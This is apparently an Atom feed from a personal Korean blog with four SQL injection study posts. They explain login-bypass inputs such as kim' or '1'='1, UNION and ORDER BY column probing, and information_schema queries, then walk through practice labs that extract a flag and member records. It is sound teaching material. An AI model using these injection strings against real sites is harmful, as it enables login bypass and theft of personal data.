<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-28T03:51:57+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">나의 코딩 공부</title><subtitle>ethan의 블로그</subtitle><author><name>ethan</name></author><entry><title type="html">SQL injection 데이터 추출(문제풀이)</title><link href="http://localhost:4000/sql-injection/SQLinjection4/" rel="alternate" type="text/html" title="SQL injection 데이터 추출(문제풀이)" /><published>2024-05-28T00:00:00+09:00</published><updated>2024-05-28T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection4</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection4/"><![CDATA[<p><br /></p>

<h1 id="1sql-injection-데이터-추출문제풀이"><span style="background:#000000; color:#ffffff">1.SQL injection 데이터 추출<span style="font-size:50%">(문제풀이)</span></span></h1>

<p><br /></p>

<p><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>

<p><span style="font-weight:bold; font-size:15px">1. 교육 목적으로만 이용 해주세요.</span><br />
<span style="font-weight:bold; font-size:15px">2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br />
<span style="font-weight:bold; font-size:15px">3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span></p>

<p><br /></p>

<h2 id="11-1번-문제"><span style="background:#696969; color:#ffffff">1.1  1번 문제</span></h2>

<p><br /></p>

<p>본 글은 문제풀이 과정만 나타냈기에, 과정에서 이해가 안되면 이전 글을 보고 오시면 좋습니다.</p>

<h3 id="111-sql-injection-포인트-찾기"><span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span></h3>

<hr />

<p><br /><img src="/images/2024-05-28-SQLinjection4/image-20240528020605181.png" alt="image-20240528020605181" style="zoom:50%;" /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528021016000.png" alt="image-20240528021016000" style="zoom:50%;" /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528021131341.png" alt="image-20240528021131341" style="zoom:50%;" /></p>

<p>nor 만 검색해도 normaltic이 출력되는 것으로 보아 like id  ‘%아이디%’ 로 구성되어 있다고 유추할 수 있습니다.</p>

<h3 id="112-column-개수-찾기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.2 column 개수 찾기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528021327522.png" alt="image-20240528021327522" style="zoom:50%;" /></p>

<p>order by 1부터 순차적으로 숫자를 증가해서 넣었을 때 5 이상 부터는 출력되지 않으므로 컬럼 수는 4개입니다.</p>

<h3 id="113-출력되는-column-위치-찾기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.3 출력되는 column 위치 찾기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528021423237.png" alt="image-20240528021423237" style="zoom:50%;" /></p>

<p>1,2,3,4 값을 출력했을 때 위치는 순서대로 컬럼이 배치되어 있음을 알 수 있습니다.</p>

<p><br /></p>

<h3 id="114-db이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528021502384.png" alt="image-20240528021502384" style="zoom:50%;" /></p>

<p>1,2,3,4 모두 출력되므로 그 중 하나에 database()를 넣어주며 이름을 확인한다.</p>

<h3 id="115-table이름-확인하기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528021648760.png" alt="image-20240528021648760" style="zoom:50%;" /></p>

<p>flag_table 부터 확인합니다.</p>

<h3 id="116-column-이름-확인하기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528021835356.png" alt="image-20240528021835356" style="zoom:50%;" /></p>

<p>flag_table 의 컬럼은 flag네요.</p>

<p><br /></p>

<h3 id="117-data-추출하기"><span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528022006574.png" alt="image-20240528022006574" style="zoom:50%;" /></p>

<p><br /></p>

<h2 id="12-2번-문제"><span style="background:#696969; color:#ffffff">1.2  2번 문제</span></h2>

<p><br /></p>

<h3 id="111-sql-injection-포인트-찾기-1"><span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528022255869.png" alt="image-20240528022255869" style="zoom:50%;" /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528022322458.png" alt="image-20240528022322458" style="zoom:50%;" /></p>

<p>normaltic이라고 검색할 때는 정보가 나오는데, n 만 검색했을 때는 나오지 않고 검색한 단어 전체를 검색해야 정보가 뜹니다.</p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528022358841.png" alt="image-20240528022358841" style="zoom:50%;" /></p>

<p>sql injection이 가능하네요.</p>

<h3 id="112-column-개수-찾기-1"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.2 column 개수 찾기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528022454579.png" alt="image-20240528022454579" style="zoom:50%;" /></p>

<p>7 이상부터 정보가 안 나오니 칼럼 수는 6 개 입니다.</p>

<h3 id="113-출력되는-column-위치-찾기-1"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.3 출력되는 column 위치 찾기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528022613341.png" alt="image-20240528022613341" style="zoom:50%;" /></p>

<p>6 값 만 정보에 뜨므로 이후에 필요한 정보는 6 위치에 작성하면 됩니다.</p>

<p><br /></p>

<h3 id="114-db이름-확인하기-1"><span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528022640388.png" alt="image-20240528022640388" style="zoom:50%;" /></p>

<h3 id="115-table이름-확인하기-1"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528022745304.png" alt="image-20240528022745304" style="zoom:50%;" /></p>

<h3 id="116-column-이름-확인하기-1"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528022855395.png" alt="image-20240528022855395" style="zoom:50%;" /></p>

<p><br /></p>

<h3 id="117-data-추출하기-1"><span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528022951224.png" alt="image-20240528022951224" style="zoom:50%;" /></p>

<p>데이터를 출력했는데 ‘not here’ 이라고 뜨네요 ㅠㅠ 다른 곳을 찾아야 할 것 같습니다.</p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528023040440.png" alt="image-20240528023040440" style="zoom:50%;" /></p>

<p>우선 이 데이터에서 여러 개인데 맨 위에 것 만 표시되어 밑에 있는 데이터가 안보일 수 도 있다는 가정 하에 order by 를 봤는데 없네요.</p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528023245129.png" alt="image-20240528023245129" style="zoom:50%;" /></p>

<p>다른 컬럼 이름 도 찾아봤는데 없었습니다.</p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528023431897.png" alt="image-20240528023431897" style="zoom:50%;" /></p>

<p>다른 테이블 이름이 존재했네요.</p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528023533026.png" alt="image-20240528023533026" style="zoom:50%;" /></p>

<p><img src="/images/2024-05-28-SQLinjection4/image-20240528023659672.png" alt="image-20240528023659672" style="zoom:50%;" /></p>

<p>다른 테이블로 들어가서 데이터를 보니 플래그 값이 있었습니다!</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SQL injection 데이터 추출(2)</title><link href="http://localhost:4000/sql-injection/SQLinjection3/" rel="alternate" type="text/html" title="SQL injection 데이터 추출(2)" /><published>2024-05-27T00:00:00+09:00</published><updated>2024-05-27T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection3</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection3/"><![CDATA[<p><br /></p>

<h1 id="1sql-injection-데이터-추출2"><span style="background:#000000; color:#ffffff">1.SQL injection 데이터 추출(2)</span></h1>

<p><br /></p>

<p><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>

<p><span style="font-weight:bold; font-size:15px">1. 교육 목적으로만 이용 해주세요.</span><br />
<span style="font-weight:bold; font-size:15px">2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br />
<span style="font-weight:bold; font-size:15px">3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span></p>

<p><br /></p>

<h2 id="11-문제풀이"><span style="background:#696969; color:#ffffff">1.1 문제풀이</span></h2>

<p><br /></p>

<p><span style="font-weight:bold; font-size:25px">▶ 목표 : 아이디가 doldol인 데이터만 출력하기!!! </span></p>

<p><br /></p>

<h3 id="111-sql-injection-포인트-찾기"><span style="background:#A9A9A9; color:#ffffff">1.1.1 sql injection 포인트 찾기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528002406036.png" alt="image-20240528002406036" style="zoom:50%;" /></p>

<p>패스워드가 1234 인 데이터를 검색하면 normaltic에 대한 데이터가 나오네요.</p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528002507967.png" alt="image-20240528002507967" style="zoom:50%;" /></p>

<p>이 검색 값이 sql injection이 가능한지 확인합니다. pass 의 값 만으로 다른 컬럼도 출력되는 것으로 보아 어떤 구조인지 예측이 갑니다.</p>

<h3 id="112-column-개수-찾기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.2 column 개수 찾기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528002608611.png" alt="image-20240528002608611" style="zoom:50%;" /></p>

<p>order by 값을 1씩 증가하여 칼럼의 개수가 몇 개인지 셀 수 있습니다.<br />
5에서 에러가 나는 것으로 보아 4개의 컬럼이 존재하는 것을 확인했습니다.</p>

<h3 id="113-출력되는-column-위치-찾기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.3 출력되는 column 위치 찾기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528003718074.png" alt="image-20240528003718074" style="zoom:50%;" /></p>

<p>union select 를 이용하여 출력되는 자리에 어떤 값이 나오는 가를 확인한 결과,  <br />
1,2,3,4 차례대로 나오네요.</p>

<p><br /></p>

<h3 id="114-db이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.1.4 DB이름 확인하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528003751388.png" alt="image-20240528003751388" style="zoom:50%;" /></p>

<p>1,2,3,4 위치에도 데이터가 출력되어 나오기 때문에 그 중 하나에 database()를 넣어 데이터베이스 이름을 확인했습니다.</p>

<h3 id="115-table이름-확인하기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.5 table이름 확인하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528003852958.png" alt="image-20240528003852958" style="zoom:50%;" /></p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528003922888.png" alt="image-20240528003922888" style="zoom: 67%;" /></p>

<p>table 이름 중 memeber 에 doldol의 데이터가 있기 때문에 member를 사용합니다.</p>

<h3 id="116-column-이름-확인하기"><br /><span style="background:#A9A9A9; color:#ffffff">1.1.6 column 이름 확인하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528005434953.png" alt="image-20240528005434953" style="zoom:50%;" /></p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528005457625.png" alt="image-20240528005457625" /></p>

<p>맨 위의 데이터를 보아 필요한 칼럼은 순서대로 id, pass, email, info 인 것이 확인됩니다.</p>

<p><br /></p>

<h3 id="117-data-추출하기"><span style="background:#A9A9A9; color:#ffffff">1.1.7 data 추출하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528004203347.png" alt="image-20240528004203347" style="zoom:50%;" /></p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528004248335.png" alt="image-20240528004248335" style="zoom: 60%;" /></p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528004328568.png" alt="image-20240528004328568" style="zoom:50%;" /></p>

<p><img src="/images/2024-05-27-SQLinjection3/image-20240528004350815.png" alt="image-20240528004350815" style="zoom: 60%;" /></p>

<p>doldol의 데이터 하나만 나오도록 출력했습니다.</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SQL injection 데이터 추출(1)</title><link href="http://localhost:4000/sql-injection/SQLinjection2/" rel="alternate" type="text/html" title="SQL injection 데이터 추출(1)" /><published>2024-05-24T00:00:00+09:00</published><updated>2024-05-24T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection2</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection2/"><![CDATA[<p><br /></p>

<h1 id="1sql-injection-데이터-추출1"><span style="background:#000000; color:#ffffff">1.SQL injection 데이터 추출(1)</span></h1>

<p><br /></p>

<p><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>

<p><span style="font-weight:bold; font-size:15px">1. 교육 목적으로만 이용 해주세요.</span><br />
<span style="font-weight:bold; font-size:15px">2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br />
<span style="font-weight:bold; font-size:15px">3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span></p>

<p><br /></p>

<h2 id="11-개요"><span style="background:#696969; color:#ffffff">1.1 개요</span></h2>

<p><br /></p>

<p>① 인증 우회 - 로그인 하기<br />
② 데이터 추출</p>

<p>간단하게 두 가지로 나눠 볼 수 있습니다.</p>

<p>저번에 인증 우회에 대해 다뤘다면 <br />
이번에는 데이터 추출을 어떻게 하는지에 대해 알아보겠습니다.</p>

<p>데이터 추출은 어떤 게 있을까요?  일단 DB를 통해 데이터를 불러오는 쿼리 문을 쓰는 곳에서 사용할 수 있습니다.<br />
예를 들면 로그인 폼이나 게시판 등이 있겠네요.</p>

<p>로그인 폼 같은 경우는 작성하면 어떤 데이터가 불러오는 것인지 눈으로 확인할 수 없고,  맞고 틀렸는지만 확인이 가능합니다.<br />
<span style="font-weight:bold; font-size:15px">그러나 게시판의 검색 기능 같은 경우를 생각해보면 작성을 할 시에 어떤 데이터를 불러오는 지 눈으로 확인이 가능합니다.   </span></p>

<p>이번에는 비교적 난이도가 쉬운,  후자에 대해서 살펴보도록 하겠습니다.</p>

<p><br /></p>

<h2 id="12-데이터-추출에-필요한-개념-알아보기"><span style="background:#696969; color:#ffffff">1.2 데이터 추출에 필요한 개념 알아보기</span></h2>

<p><br /></p>

<p>일단 게시판에 관한 db의 sql 쿼리는 게시판의 관한 내용만 포함되어 있기 때문에, <br />
개인정보를 빼내려는 목적에 부합하지 않습니다.</p>

<p>따라서 sql문을 조작하여 개인정보를 추출해야 한다는 것인데,<br />
db의 이름, table의 이름, column의 이름을 알지 않는 한 불가능합니다.</p>

<p>그래서 알아야 할 두 가지의  sql 쿼리 문이 있습니다. ① union 과 ②order by 입니다.</p>

<p><br /></p>

<p><br /></p>

<p><span style="font-weight:bold; font-size:25px">①UNION</span></p>

<p><br /></p>

<p><span style="font-size:20px">1) 일반적인 select</span></p>

<p>보통 데이터를 불러올 때 select를 사용하죠. <br />
로그인이라고 한다면 ,예) select username, password from table;   table에 모든 username, password를 불러옵니다.</p>

<p>예) <img src="/images/2024-05-24-SQLinjection2/image-20240524064155575.png" alt="image-20240524064155575" /></p>

<p><br /></p>

<p><br /></p>

<p><span style="font-size:20px">2) union을 사용한 select</span></p>

<p>union은 select 문을 2 개 이상 결합시켜서 나타낼 때 사용합니다. <br />
예) <span style="font-weight:bold; font-size:15px">select</span> username, password from table union<span style="font-weight:bold; font-size:15px"> select</span> 1, 2 union <span style="font-weight:bold; font-size:15px">select</span> 3,4; (테이블 없이 작성하면, 칼럼 위치에 값을 배치합니다.)</p>

<p>예)<img src="/images/2024-05-24-SQLinjection2/image-20240524070844964.png" alt="image-20240524070844964" /></p>

<p>여기서 select로 1,2 와 3,4를 나타낸 것은 테이블의 데이터를 불러온 것이 아니라 값만 출력한 것임을<br />
유념해야 합니다.</p>

<p><br /></p>

<p>▶ union all  vs  union</p>

<p>union all : 겹치는 값이 존재 하더라도 전부 출력합니다.</p>

<p>union : 겹치는 값이 존재하면 그 중 하나만 출력합니다.</p>

<p>예)  위의 마지막 데이터 값을  3,4가 아닌 1,2를 작성하여 같은 값으로 표현해보겠습니다.</p>

<p>(union all)<img src="/images/2024-05-24-SQLinjection2/image-20240525001254806.png" alt="image-20240525001254806" />(union)<img src="/images/2024-05-24-SQLinjection2/image-20240525001138029.png" alt="image-20240525001138029" /></p>

<p><br /></p>

<p><span style="font-weight:bold; font-size:25px">②OREDER BY</span></p>

<p>order by : 데이터를 정렬하는 역할을 합니다.</p>

<p>SELECT * FROM Products ORDER BY Price(정리할 컬럼명)  ASC(오름차순)/DESC(내림차순);</p>

<p>이렇게 원래는 정리할 컬럼명에 컬럼명을 작성해야합니다.<br />
다만 컬럼 index 번호(위치)에 따라 숫자를 대신해서 작성하여도, 같은 역할을 수행합니다.</p>

<p>SELECT username, password FROM users ORDER BY 1; ▶ 1이므로 username으로 정렬합니다. (defalt로 오름차순)</p>

<p>SELECT username, password FROM users ORDER BY 2; ▶ 2 이므로 password으로 정렬합니다.</p>

<p><br /></p>

<h2 id="13-데이터-추출의-필수-과정db데이터를-화면에서-볼-수-있을때"><span style="background:#696969; color:#ffffff">1.3 데이터 추출의 필수 과정<span style="font-size:50%">(DB데이터를 화면에서 볼 수 있을때)</span></span></h2>

<p><br /></p>

<p><span style="font-weight:bold; font-size:20px"><union 과="" order="" by를="" 이용한="" sql="" injection="" pocess="">&lt;/span&gt;</union></span></p>

<p><br /></p>

<p><span style="font-weight:bold; font-size:15px">1. sql injection 포인트 찾기 (sql injection이 가능한지 확인하고, 어떤 로직으로 구성했을까? 예측하기)</span></p>

<p><span style="font-weight:bold; font-size:15px">2. column 개수 찾기</span></p>

<p><span style="font-weight:bold; font-size:15px">3.  출력되는 column 위치 찾기</span></p>

<p><span style="font-weight:bold; font-size:15px">4. DB이름 확인하기</span></p>

<p><span style="font-weight:bold; font-size:15px">5. table이름 확인하기</span></p>

<p><span style="font-weight:bold; font-size:15px">6. column 이름 확인하기</span></p>

<p><span style="font-weight:bold; font-size:15px">7. data 추출하기</span></p>

<p>예제에 따라 해당 절차를 시행해보면서 설명해보겠습니다.</p>

<p><br /></p>

<h3 id="131-sql-injection-포인트-찾기"><span style="background:#A9A9A9; color:#ffffff">1.3.1 sql injection 포인트 찾기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525013022486.png" alt="1" style="zoom:50%;" /></p>

<p>게임 이름을 검색하면 그 이름과 스코어 제작사 이름이 나오는 구조인 것 같습니다.</p>

<p><br /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525013104123.png" alt="image-20240525013104123" style="zoom: 50%;" /></p>

<p>하지만 over만 쳐도 나오는 것으로 보아 like ‘%글자%’ 구문으로 한 글자만 일치하더라도 출력하는 구조 입니다.</p>

<p><br /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525013221239.png" alt="image-20240525013221239" style="zoom:50%;" /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525020302308.png" alt="image-20240525020302308" style="zoom:50%;" /></p>

<p>over%’ and ‘1%’=’1는 sql 인젝션이 가능한가를 살펴보기 위해서 사용했습니다.<br />
sql 문을 사용했다면, and 에 양변이 같은 형식을 취한 구조는 항상 같은 결과가 나오기 때문에 <br />
sql 인젝션이 가능하다는 것을 확인할 수 있죠.</p>

<p>밑에 구문은 실제 구문인데, 왜 over%’ and ‘1%’=’1 를 썼는가에 대해 이해가 가지 않으시면 보시기 바랍니다.</p>

<h3 id="132-column-개수-찾기"><br /><span style="background:#A9A9A9; color:#ffffff">1.3.2 column 개수 찾기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525013448020.png" style="zoom:50%;" /></p>

<p>위에서 살펴본 order by 특성에 따라 order by 1은 첫 번째 칼럼으로 정렬한 것입니다.</p>

<p>order by 1/ order by 2 / order by 3 ….. 순차적으로 늘려가면 에러가 발생합니다.</p>

<p><br /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525013407465.png" alt="image-20240525013407465" style="zoom: 33%;" /></p>

<p>여기에서는 order by 5에서 에러가 발생했습니다. 왜냐하면 불러온 데이터의 칼럼의 수가 5 개 이상은 없기 때문입니다.</p>

<p>그래서 칼럼의 개수는 4 개라는 사실을 알 수 있습니다.</p>

<h3 id="133-출력되는-column-위치-찾기"><br /><span style="background:#A9A9A9; color:#ffffff">1.3.3 출력되는 column 위치 찾기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525014303487.png" alt="image-20240525014303487" style="zoom:50%;" /></p>

<p>union select를 이용해서 표현하면, db에서 불러온 데이터와 1,2,3,4의 값이 같이 보여지게 됩니다.</p>

<p>그런데 보시는 바와 같이 2,3,4만 나왔습니다. 불러온 데이터는 4 개의 칼럼이지만 3 개의 칼럼만 보이는 형태이네요.</p>

<p>따라서 1에는 데이터 값을 작성해도 보이지 않으니 2,3,4 위치에 값을 작성하여 활용하는 것이 좋겠습니다.</p>

<p><br /></p>

<h3 id="134-db이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.3.4 DB이름 확인하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525014348702.png" alt="image-20240525014348702" style="zoom:50%;" /></p>

<p>DB이름 ▶ database()로 확인할 수 있습니다. 그래서 출력이 가능한 2,3,4 위치에 값을 넣어 확인해 볼 수 있겠습니다.</p>

<h3 id="135-table이름-확인하기"><br /><span style="background:#A9A9A9; color:#ffffff">1.3.5 table이름 확인하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525015343016.png" alt="image-20240525015343016" style="zoom:50%;" /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525022345330.png" alt="image-20240525022345330" /></p>

<p>table 이름 ▶ select table_name from information_schema.tables where table_schema=’DB이름’ 로 확인 가능합니다.</p>

<p>table_shema 로 DB이름을 지정하지 않으면 모든 table이름이 나와서 불필요한 것 까지 확인하시게 됩니다.</p>

<h3 id="136-column-이름-확인하기"><br /><span style="background:#A9A9A9; color:#ffffff">1.3.6 column 이름 확인하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525015555601.png" alt="image-20240525015555601" style="zoom:50%;" /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525022920840.png" alt="image-20240525022920840" /></p>

<p>column 이름 ▶  select column_name from information_schema.columns where table_name=’table이름’</p>

<p><br /></p>

<h3 id="137-data-추출하기"><span style="background:#A9A9A9; color:#ffffff">1.3.7 data 추출하기</span></h3>

<hr />

<p><br /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525015730186.png" alt="image-20240525015730186" style="zoom:50%;" /></p>

<p><img src="/images/2024-05-24-SQLinjection2/image-20240525023059257.png" alt="image-20240525023059257" style="zoom:67%;" /></p>

<p>결국 개인정보 데이터 추출에 성공했네요. ~~~</p>]]></content><author><name>ethan</name></author><category term="SQL-injection" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SQL injection이란?</title><link href="http://localhost:4000/sql-injection/SQLinjection1/" rel="alternate" type="text/html" title="SQL injection이란?" /><published>2024-05-16T00:00:00+09:00</published><updated>2024-05-16T00:00:00+09:00</updated><id>http://localhost:4000/sql-injection/SQLinjection1</id><content type="html" xml:base="http://localhost:4000/sql-injection/SQLinjection1/"><![CDATA[<p><br /></p>

<h1 id="1sql-injection"><span style="background:#000000; color:#ffffff">1.SQL injection</span></h1>

<p><br /><span style="font-weight:bold; font-size:15px"> ※ 주의 사항 :</span></p>

<p><span style="font-weight:bold; font-size:15px">1. 교육 목적으로만 이용 해주세요.</span><br />
<span style="font-weight:bold; font-size:15px">2. 무단 침입, 데이터 유출, 개인 정보 침해 등 불법적인 활동은 심각한 법적 결과를 초래할 수 있습니다.</span><br />
<span style="font-weight:bold; font-size:15px">3.  개인적인 테스트 환경을 구축해서 실습하시길 바랍니다. </span></p>

<p><br /></p>

<h2 id="11-개념"><span style="background:#696969; color:#ffffff">1.1 개념</span></h2>

<p><br /></p>

<p>먼저 용어에 대해서 살펴봅시다. sql은 db에 요청하는 언어 이고, injection은 영어 뜻으로 <br />
주입하다, 투입하다 라는 뜻이 있습니다. 그러면 SQL injection의 말은 “sql이라는 db언어로 투입하다” 가 되겠네요.</p>

<p>즉, 사용자가 db와 관련된 프로그램의 허점을 이용하는 것으로 특정 sql 쿼리를 작성하여, 데이터 베이스를 공격하는 것이라고<br />
보면 됩니다.</p>

<p><br /></p>

<p>예를 들어, 로그인 페이지가 있다고 가정해봅시다. 그러면 회원 가입을 한 이용자의 데이터를 불러와서 이용자의 id, password가<br />
맞는지 대조해보는 작업을 하는데 이때 데이터를 불러오는 과정에서 sql쿼리를 사용하게 됩니다.</p>

<p>사용자가 id, password 입력<br />
▶ post 방식으로 서버로 데이터 전송 <br />
▶ 준비된 select * from table where id = ‘<strong>__</strong>__’  와 같은 sql문에 빈칸에 id 나 password를 넣어 찾게 되는 과정</p>

<p>sql injection은 빈칸에 적게 되는 id 나 password에 sql문의 취약한 부분을 공략해서 로그인이 가능하기도 합니다.<br />
다음은 방법을 통해 더 이해해 보도록 합시다.</p>

<p><br /></p>

<p><br /></p>

<h2 id="12-인증-우회-방법"><span style="background:#696969; color:#ffffff">1.2 인증 우회 방법</span></h2>

<p><br /></p>

<p>select * from login where id = ‘<strong>__</strong>__’   빈칸에 ‘를 넣어본다고 하면, 어떻게 될까요? 오류가 날 것입니다. <br />
문법이 틀렸기 때문이죠.</p>

<p>그렇습니다. 안에 알맞은 문법과 값을 넣는다면 아무 문제없이 작동될 것이고, 비틀어서 원하는 정보를 얻기도 합니다.</p>

<p><br /></p>

<p><img src="/images/2024-05-16-SQLinjection1/image-20240516032610710.png" alt="image-20240516032610710" /></p>

<p>실제 제 로그인 페이지와 연결한 db입니다. 2개의 행 데이터가 존재합니다. <br />
문제를 통해 방법을 알아봅시다.</p>

<p><br /></p>

<p><span style="font-weight:bold; font-size:20px">1. select * from table where id = ‘<strong>__</strong>__’ </span><br />
<span style="font-weight:bold; font-size:20px">빈칸에 kim’ and ‘1’=’1 을 넣으면 어떻게 될까요?</span></p>

<p><span style="font-weight:bold; font-size:20px">답은</span></p>

<p><img src="/images/2024-05-16-SQLinjection1/image-20240516033046974.png" alt="image-20240516033046974" /></p>

<p>and 는 왼쪽 구문과 오른쪽 구문이 서로 존재해야 나타납니다. 그런데 ‘1’=’1’ 은 참이면서 kim인 데이터가 존재하므로<br />
이와 같은 데이터가 나오게 됩니다.</p>

<p><br /></p>

<p><span style="font-weight:bold; font-size:20px">2. select * from table where id = ‘<strong>__</strong>__’ </span><br />
<span style="font-weight:bold; font-size:20px">빈칸에 kim’ or ‘1’=’1 을 넣으면 어떻게 될까요?</span></p>

<p><span style="font-weight:bold; font-size:20px">답은</span></p>

<p><img src="/images/2024-05-16-SQLinjection1/image-20240516033718568.png" alt="image-20240516033718568" /></p>

<p>or 은 왼쪽 구문과 오른쪽 구문이 하나라도 존재하면 나타납니다. 그런데 ‘1’=’1’ 이 참이므로 참인 모든 데이터가 나오게<br />
됩니다.</p>

<p><br /></p>

<p><span style="font-weight:bold; font-size:20px">3. select * from table where id = ‘<strong>__</strong>__’ and passoword = ‘5678’</span> <br />
<span style="font-weight:bold; font-size:20px">빈칸에 kim’ # 을 넣으면 어떻게 될까요?</span></p>

<p><span style="font-weight:bold; font-size:20px">답은</span></p>

<p><img src="/images/2024-05-16-SQLinjection1/image-20240516034314892.png" alt="image-20240516034314892" /></p>

<p>어째서 이런 답이 나왔는지 궁금하실 겁니다.  mysql에서 #은 주석입니다. 그렇기 때문에 # 로 뒤로 오는 구문은<br />
사실상 의미가 없고, kim만 선택해서 출력하라는 명령만 됩니다.</p>

<p><br /></p>

<p><span style="font-weight:bold; font-size:20px">4. select * from table where id = ‘<strong>__</strong>__’ and passoword = ‘5678’</span> <br />
<span style="font-weight:bold; font-size:20px">빈칸에 kim’ or ’1’ =’1 을 넣으면 어떻게 될까요?</span></p>

